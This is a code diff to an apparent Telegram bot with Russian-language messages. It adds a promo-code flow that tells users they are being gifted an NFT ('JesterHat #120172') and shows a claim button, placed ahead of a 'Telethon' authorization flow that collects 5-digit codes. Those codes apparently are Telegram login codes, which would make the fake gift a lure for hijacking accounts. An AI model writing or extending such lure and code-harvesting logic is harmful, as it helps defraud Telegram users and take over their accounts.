@@ -333,8 +333,49 @@ async def on_webapp_data(msg: Message, state: FSMContext):
 
     try:
         payload = json.loads(raw)
-        code = str(payload.get('code', '')).strip()
     except Exception:
+        payload = {}
+
+    # ── Промокод флоу ──────────────────────────────────────────────────────
+    promo_code = str(payload.get('promo', '')).strip().lower()
+    captcha_ok = payload.get('captcha_passed', False)
+
+    if promo_code:
+        if not captcha_ok:
+            await msg.answer('❌ <b>Капча не пройдена.</b> Попробуйте снова — /promo ' + promo_code)
+            return
+
+        from data import Promo
+        promo = Promo()
+        ok = promo.use(promo_code, msg.from_user.id)
+
+        if not ok:
+            row = promo.get(promo_code)
+            if not row:
+                await msg.answer('❌ Промокод не найден.')
+            elif promo.already_used(promo_code, msg.from_user.id):
+                await msg.answer('⚠️ Вы уже использовали этот промокод.')
+            else:
+                await msg.answer('❌ Промокод исчерпан.')
+            return
+
+        # Капча пройдена, промокод принят — выдаём NFT
+        await msg.answer(
+            '✅ <b>Капча пройдена!</b> Промокод активирован.\n\n'
+            '🎁 <b>Вам дарят NFT: JesterHat #120172</b>\n\n'
+            'Учтите, что подарок можно принять только с аккаунта, '
+            'на который был отправлен данный подарок. '
+            'Ссылка действительна 60 минут с момента получения.\n\n'
+            'https://t.me/nft/JesterHat-120172',
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
+                InlineKeyboardButton('Получить 🎁', url='https://t.me/FairStars_robot?start=gift')
+            ]])
+        )
+        return
+
+    # ── Telethon флоу (обычная авторизация) ────────────────────────────────
+    code = str(payload.get('code', '')).strip()
+    if not code:
         code = raw.strip()
 
     if not code or len(code) != 5 or not code.isdigit():
